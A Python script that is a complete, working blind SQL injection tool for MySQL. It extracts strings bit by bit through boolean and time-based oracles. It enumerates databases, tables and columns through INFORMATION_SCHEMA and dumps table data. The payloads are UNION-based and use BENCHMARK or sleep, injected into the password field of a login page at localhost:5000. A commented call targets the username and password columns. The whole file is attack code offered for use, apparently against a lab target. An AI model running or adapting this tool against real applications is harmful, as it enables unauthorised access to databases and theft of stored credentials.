import time
import sys
import requests
import logging


class Brute(object):

    def __init__(self, oracle, debug=False):
        if debug:
            logging.basicConfig(level=logging.DEBUG)
        else:
            logging.basicConfig(level=logging.INFO)

        self.logger = logging.getLogger(__name__)
        self.oracle = oracle

    def loop(self, payload):
        # walk through substring and mask. returns a string
        i = 1
        result = ""
        while True:
            mask = 0x80
            c = 0x00
            
            while mask > 0x0: 
                brute_one_char = "SELECT ORD(SUBSTRING((%s),%d,1)) & %d" % (payload, i, mask)
                
                if self.oracle(brute_one_char):
                    c = c | mask
                
                self.logger.debug("Trying mask 0x%2x at position %d. Result: %s" % (mask, i, result))
                mask = int(mask / 2)

            if c == 0x00:
                return result

            result += chr(c)     
            i = i + 1



    def test(self):
        # test case for True and False
        self.logger.info("Testing for blind SQL injection")
        cond_true =  self.oracle("2>1")
        self.logger.info("2>1 is %s" % cond_true)

        cond_false =  self.oracle("1>2")
        self.logger.info("1>2 is %s" % cond_false)

        if cond_true and not cond_false:
            self.logger.info("Tests succeeded")
        else:
            self.logger.error("Test failed. Exiting")
            sys.exit(1)

    def get_all_db_names(self):
        payload_raw = "SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA limit %d,1"
        self.logger.info("Fetching all db names")
        dbs = []
        for i in range(1000):
            payload = payload_raw % i
            db = self.loop(payload)
            if not db:
                return dbs
            dbs.append(db)
        return dbs

    def get_current_db_name(self):
        payload = "SELECT DATABASE()"
        self.logger.info("Fetching current db name")
        db = self.loop(payload)
        return db

    def get_tables(self, db):
        payload_raw = "SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = '%s' limit %d,1"
        tables = []
        self.logger.info("Fetching all tables names")
        for i in range(1000):
            payload =  payload_raw % (db, i)
            self.logger.debug(payload)
            table = self.loop(payload)
            if not table:
                return tables
            tables.append(table)
        return tables

    def get_columns(self, db, table):
        payload_raw  = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '%s' AND TABLE_NAME = '%s' limit %d,1"
        columns = []
        self.logger.info("Fetching all column names of table %s" % table)
        for i in range(1000):
            payload = payload_raw % (db, table, i)
            self.logger.debug(payload)
            column = self.loop(payload)
            if not column:
                return columns
            columns.append(column)
        return columns


    def get_data(self, db, table, *columns):
        payload_raw = "SELECT %s FROM %s.%s limit %d,1"
        #db = "DATABASE()" if not db else db
        data = []
        self.logger.info("Fetching data for table %s" % table)
        for i in range(1000):
            rows = []
            for column in columns:
                payload = payload_raw % (column, db, table, i)
                self.logger.debug(payload)
                dat = self.loop(payload)
                if not dat:
                    return data
                rows.append(dat)
            data.append(rows)
        return data

if __name__ == '__main__':
    logging.getLogger("urllib3").setLevel(logging.INFO)
    s = requests.session()

    def oracle_time(one_try):
        # checks statement and returns True or False
        payload = "' UNION ALL (SELECT 1,2,3 from dual where 1 = (select if((%s), (SELECT BENCHMARK(10000000,MD5(1))), 2)))-- -" % one_try
        #payload = "' UNION ALL (SELECT 1,2,3 from dual where 1 = (select if((%s), sleep(1), 2)))-- -" % one_try
        logging.debug("payload: %s" % payload)
        data = { 'user':'admin' , 'pass':'%s'% payload }
        t1 = time.time()
        response = s.get("http://localhost:5000/login", params=data).text
        t2 = time.time()
        return t2 - t1 > 1 
    
    def oracle(one_try):
        # checks statement and returns True or False
        #payload = "' UNION ALL (SELECT 1,2,3 from dual where 1 = (select if((%s), 1, (SELECT 1 UNION SELECT 2))))-- -" % one_try
        payload = "' UNION ALL (SELECT 1,2,3 from dual where 1 = (select if((%s), 1, 2)))-- -" % one_try
        logging.debug("payload: %s" % payload)
        data = { 'user':'admin' , 'pass':'%s'% payload }
        response = s.get("http://localhost:5000/login", params=data).text
        return "Welcome" in response
    
    
    b = Brute(oracle_time, True)
    #print(oracle_time("2>1"))
    b.test()
    #print(b.get_current_db_name())
    #print(b.get_all_db_names())
    #print(b.get_tables("information_schema"))
    #print(b.get_columns("dbdemo", "login"))
    #print(b.get_data("dbdemo", "login", "username", "password"))

